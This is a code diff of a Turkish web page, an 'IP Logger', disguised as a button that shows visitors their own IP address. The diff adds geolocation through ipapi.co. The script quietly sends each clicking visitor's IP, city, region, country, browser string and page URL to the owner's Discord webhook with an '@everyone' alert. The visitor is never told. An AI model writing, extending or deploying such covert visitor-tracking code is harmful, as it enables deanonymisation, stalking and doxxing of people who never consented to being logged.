@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Kaydedici - Buton</title>
+    <title>IP Kaydedici - Discord</title>
     <style>
         * {
             margin: 0;
@@ -55,11 +55,18 @@
             display: none;
             box-shadow: 0 5px 20px rgba(0,0,0,0.2);
             border: 1px solid white;
+            text-align: center;
         }
 
         .ip-box.show {
             display: block;
             animation: fadeIn 0.3s ease;
+        }
+
+        .city-name {
+            font-size: 0.9rem;
+            margin-top: 0.5rem;
+            color: #555;
         }
 
         @keyframes fadeIn {
@@ -81,6 +88,7 @@
 
     <div class="ip-box" id="ipBox">
         🔍 IP adresin: <span id="ipAddress">Yükleniyor...</span>
+        <div class="city-name" id="cityName"></div>
     </div>
 
     <script>
@@ -90,86 +98,86 @@
         const button = document.getElementById('ipButton');
         const ipBox = document.getElementById('ipBox');
         const ipSpan = document.getElementById('ipAddress');
+        const cityNameSpan = document.getElementById('cityName');
 
-        // Discord'a IP gönder
-        async function sendIPToDiscord(ip, userAgent) {
+        async function getCityFromIP(ip) {
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await response.json();
+                if (data.error) return null;
+                return {
+                    city: data.city || "Bilinmiyor",
+                    region: data.region || "Bilinmiyor",
+                    country: data.country_name || "Bilinmiyor"
+                };
+            } catch(hata) {
+                return null;
+            }
+        }
+
+        async function sendIPToDiscord(ip, userAgent, cityData) {
+            let locationText = "Bilinmiyor";
+            if (cityData && cityData.city !== "Bilinmiyor") {
+                locationText = `${cityData.city}, ${cityData.region}, ${cityData.country}`;
+            }
+            
             const embed = {
                 title: "🔔 Yeni IP Kaydedildi!",
-                color: 0x5865F2, // Discord mavisi
+                color: 0x5865F2,
                 fields: [
-                    {
-                        name: "🌐 IP Adresi",
-                        value: `\`${ip}\``,
-                        inline: true
-                    },
-                    {
-                        name: "💻 Tarayıcı / Cihaz",
-                        value: userAgent.substring(0, 100),
-                        inline: false
-                    },
-                    {
-                        name: "📅 Tarih",
-                        value: new Date().toLocaleString('tr-TR'),
-                        inline: true
-                    },
-                    {
-                        name: "🔗 Sayfa",
-                        value: window.location.href,
-                        inline: false
-                    }
+                    { name: "🌐 IP Adresi", value: `\`${ip}\``, inline: true },
+                    { name: "📍 Şehir / Bölge / Ülke", value: locationText, inline: true },
+                    { name: "💻 Tarayıcı / Cihaz", value: userAgent.substring(0, 100), inline: false },
+                    { name: "📅 Tarih", value: new Date().toLocaleString('tr-TR'), inline: true },
+                    { name: "🔗 Sayfa", value: window.location.href, inline: false }
                 ],
-                footer: {
-                    text: "Butonlu IP Kaydedici"
-                },
                 timestamp: new Date().toISOString()
             };
 
             try {
                 await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        content: "@everyone Yeni bir ziyaretçi butona tıkladı!",
-                        embeds: [embed]
-                    })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: "@everyone Yeni bir ziyaretçi butona tıkladı!", embeds: [embed] })
                 });
-                console.log('✅ IP Discord\'a gönderildi');
                 return true;
             } catch(hata) {
-                console.error('❌ Discord\'a gönderilemedi:', hata);
                 return false;
             }
         }
 
-        // Butona tıklanınca
         button.addEventListener('click', async () => {
             try {
-                ipSpan.textContent = 'Alınıyor...';
+                ipSpan.textContent = 'IP alınıyor...';
+                cityNameSpan.textContent = '';
                 ipBox.classList.add('show');
                 
-                // 1. IP'yi al
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 const ip = data.ip;
                 const userAgent = navigator.userAgent;
                 
-                // 2. Ekranda göster
+                ipSpan.textContent = 'Şehir bilgisi alınıyor...';
+                const cityData = await getCityFromIP(ip);
+                
                 ipSpan.textContent = ip;
                 
-                // 3. Discord'a gönder (sana bildirim gelsin)
-                await sendIPToDiscord(ip, userAgent);
+                if (cityData && cityData.city !== "Bilinmiyor") {
+                    cityNameSpan.textContent = `📍 ${cityData.city}, ${cityData.country}`;
+                } else {
+                    cityNameSpan.textContent = '📍 Şehir bilgisi alınamadı';
+                }
                 
-                // 4. Kullanıcıya bilgi ver
+                await sendIPToDiscord(ip, userAgent, cityData);
+                
                 ipSpan.style.color = "#10b981";
                 setTimeout(() => {
                     ipSpan.style.color = "#333";
-                }, 2000);
+                }, 3000);
                 
             } catch (hata) {
                 ipSpan.textContent = 'Hata oluştu! Tekrar dene.';
-                console.error(hata);
+                cityNameSpan.textContent = '';
             }
         });
     </script>
